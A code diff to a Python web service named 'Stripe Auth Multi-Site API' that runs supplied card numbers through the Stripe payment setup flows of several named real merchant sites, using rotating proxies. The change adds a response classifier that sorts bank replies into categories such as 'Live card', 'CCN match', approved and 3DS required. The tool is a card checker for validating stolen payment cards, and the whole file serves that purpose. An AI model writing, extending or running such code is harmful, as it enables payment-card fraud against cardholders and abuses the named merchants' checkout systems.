@@ -10,11 +10,13 @@ Supported Target Sites:
 4. Odin Water Polo (odinwaterpolo.com)
 5. Noble Rot (noble-rot.newsstand.co.uk)
 
-Features:
-- Includes 'gateway' and 'gateway_name' in all JSON/Text responses
-- Per-request custom proxy: `&proxy=ip:port:user:pass` or `&proxy=http://...` or `&proxy=socks5://...`
-- Dynamic proxy pool with auto-rotation
-- Proxy management endpoints: `/proxy/add`, `/proxy/list`, `/proxy/clear`, `/proxy/stats`
+Response Types:
+1. APPROVED / SUCCEEDED (Card valid, SetupIntent passed) -> status: 'approved', code: 'succeeded'
+2. INSUFFICIENT FUNDS (Kam balance / Live card) -> status: 'declined', code: 'insufficient_funds'
+3. INCORRECT CVC / CVV (CCN match / Live card) -> status: 'declined', code: 'incorrect_cvc'
+4. EXPIRED CARD (Card expired) -> status: 'declined', code: 'expired_card'
+5. 3DS REQUIRED (OTP / Authentication) -> status: 'requires_action', code: '3ds_required'
+6. DO NOT HONOR / DECLINED (General bank decline) -> status: 'declined', code: 'do_not_honor' / 'card_declined'
 """
 
 import re
@@ -87,6 +89,37 @@ SITES_CONFIG = [
 ]
 
 site_rotation_index = 0
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# RESPONSE CLASSIFIER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+def classify_response(err_msg: str, code: str = None, is_success: bool = False):
+    if is_success or "succeeded" in str(code).lower() or "success" in str(err_msg).lower():
+        return "approved", "succeeded", "Payment Method Added / SetupIntent Succeeded 💎"
+
+    msg_lower = str(err_msg).lower()
+    code_lower = str(code).lower() if code else ""
+
+    if "insufficient" in msg_lower or "insufficient_funds" in code_lower:
+        return "declined", "insufficient_funds", "Your card has insufficient funds."
+    elif "security code" in msg_lower or "cvc" in msg_lower or "cvv" in msg_lower or "incorrect_cvc" in code_lower:
+        return "declined", "incorrect_cvc", "Your card's security code is incorrect."
+    elif "expired" in msg_lower or "expired_card" in code_lower:
+        return "declined", "expired_card", "Your card has expired."
+    elif "3d" in msg_lower or "action" in code_lower or "authenticate" in msg_lower:
+        return "requires_action", "3ds_required", "Card requires 3D Secure verification."
+    elif "test card" in msg_lower or "test_card" in code_lower:
+        return "declined", "live_mode_test_card", "Your card was declined. Your request was in live mode, but used a known test card."
+    elif "do not honor" in msg_lower or "do_not_honor" in code_lower:
+        return "declined", "do_not_honor", "Your card was declined (Do Not Honor)."
+    elif "lost" in msg_lower or "stolen" in msg_lower:
+        return "declined", "lost_or_stolen", "Your card was reported lost or stolen."
+    elif "incorrect_number" in code_lower or "invalid_number" in code_lower or "card number is incorrect" in msg_lower:
+        return "declined", "incorrect_number", "Your card number is incorrect."
+    else:
+        clean = re.sub(r'<[^>]+>', '', str(err_msg)).strip()
+        return "declined", code or "card_declined", clean or "Your card was declined."
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # PROXY MANAGER
@@ -232,7 +265,6 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
         if len(mm) == 1:
             mm = '0' + mm
 
-        # Proxy resolution: 1st preference is query param, 2nd is pool rotator
         proxy_url = proxy_manager.parse_proxy(proxy_input) if proxy_input else proxy_manager.get_next()
         site = get_site_config(site_param)
         domain = site["domain"]
@@ -344,13 +376,14 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
 
             if 'error' in json_stripe:
                 err = json_stripe['error']
-                decline_code = err.get('decline_code') or err.get('code') or 'card_declined'
-                message = err.get('message', 'Your card was declined.')
+                raw_code = err.get('decline_code') or err.get('code') or 'card_declined'
+                raw_msg = err.get('message', 'Your card was declined.')
+                st, cd, msg = classify_response(raw_msg, raw_code)
                 elapsed = round((time.time() - t_start) * 1000)
                 return {
-                    "status": "declined",
-                    "code": decline_code,
-                    "message": message,
+                    "status": st,
+                    "code": cd,
+                    "message": msg,
                     "gateway": full_gw,
                     "gateway_name": gw_name,
                     "site": domain,
@@ -451,18 +484,20 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                         else:
                             data = res_json.get("data", {})
                             err_msg = "Your card was declined."
+                            err_code = "card_declined"
                             if isinstance(data, dict):
                                 err_msg = data.get("error", {}).get("message") or data.get("message") or "Your card was declined."
+                                err_code = data.get("error", {}).get("code") or data.get("code") or "card_declined"
                             elif isinstance(data, str):
                                 err_msg = data
                             elif "messages" in res_json:
                                 err_msg = res_json["messages"]
 
-                            clean_msg = re.sub(r'<[^>]+>', '', str(err_msg)).strip() or "Your card was declined."
+                            st, cd, msg = classify_response(err_msg, err_code)
                             return {
-                                "status": "declined",
-                                "code": "card_declined",
-                                "message": clean_msg,
+                                "status": st,
+                                "code": cd,
+                                "message": msg,
                                 "gateway": full_gw,
                                 "gateway_name": gw_name,
                                 "site": domain,
@@ -483,11 +518,12 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "card": cc_input,
                                 "time_ms": elapsed
                             }, 200
-                        elif "declined" in res_text.lower() or "error" in res_text.lower():
+                        else:
+                            st, cd, msg = classify_response(res_text, "card_declined")
                             return {
-                                "status": "declined",
-                                "code": "card_declined",
-                                "message": "Your card was declined.",
+                                "status": st,
+                                "code": cd,
+                                "message": msg,
                                 "gateway": full_gw,
                                 "gateway_name": gw_name,
                                 "site": domain,
@@ -532,10 +568,18 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
 def index():
     return jsonify({
         "name": "Stripe Auth Multi-Site API",
-        "version": "2.2.0",
+        "version": "2.3.0",
         "status": "online",
         "sites_count": len(SITES_CONFIG),
         "proxy_pool": proxy_manager.get_stats(),
+        "response_types": {
+            "approved": "Payment Method Added / Succeeded (code: succeeded)",
+            "insufficient_funds": "Low balance / Live card (code: insufficient_funds)",
+            "incorrect_cvc": "Incorrect security code / CCN match (code: incorrect_cvc)",
+            "expired_card": "Card is expired (code: expired_card)",
+            "3ds_required": "OTP / 3DS required (code: 3ds_required)",
+            "do_not_honor": "General bank decline (code: do_not_honor)"
+        },
         "endpoints": {
             "/stripe": "GET/POST with ?cc=... &site=... &proxy=...",
             "/check": "GET/POST with ?cc=...",
@@ -635,7 +679,7 @@ def stripe_endpoint():
     result, status_code = asyncio.run(process_stripe_auth(cc, site_param, proxy_param))
 
     if fmt == 'text':
-        text_out = f"STATUS: {result.get('status', 'unknown').upper()} | MSG: {result.get('message', '')} | GATEWAY: {result.get('gateway', '')} | SITE: {result.get('site', '')} | PROXY: {result.get('proxy', '')} | CARD: {result.get('card', '')}"
+        text_out = f"STATUS: {result.get('status', 'unknown').upper()} | CODE: {result.get('code', '')} | MSG: {result.get('message', '')} | GATEWAY: {result.get('gateway', '')} | SITE: {result.get('site', '')} | PROXY: {result.get('proxy', '')} | CARD: {result.get('card', '')}"
         return Response(text_out, mimetype='text/plain'), status_code
 
     return jsonify(result), status_code
